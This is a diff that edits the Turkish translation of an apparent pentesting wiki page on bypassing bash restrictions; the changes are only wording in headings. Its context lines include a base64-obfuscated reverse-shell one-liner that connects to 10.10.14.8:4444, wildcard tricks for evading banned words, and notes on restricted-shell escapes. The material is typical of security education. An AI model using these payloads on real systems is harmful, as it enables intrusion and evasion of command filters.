@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Yolları ve yasaklı kelimeleri atlatma
+### Yasağı Kaldırma Yolları ve Yasaklı Kelimeler
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -146,7 +146,7 @@ echo ${PATH:0:1} #/
 ### Yerleşik Komutlar
 
 Dış fonksiyonları çalıştıramıyorsanız ve yalnızca RCE elde etmek için **sınırlı bir yerleşik komut setine** erişiminiz varsa, bunu yapmanın bazı pratik yolları vardır. Genellikle **tüm** **yerleşik komutları** kullanamayacaksınız, bu yüzden hapisten kurtulmak için **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten.\
-Öncelikle tüm [**shell yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** İşte bazı **öneriler**:
+Öncelikle tüm [**shell yerleşik komutlarını**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** İşte burada bazı **öneriler** var:
 ```bash
 # Get list of builtins
 declare builtins
@@ -309,7 +309,7 @@ Eğer **salt okuma ve sadece çalıştırma korumalarına** sahip bir dosya sist
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## Referanslar & Daha Fazlası
+## Referanslar & Daha Fazla
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
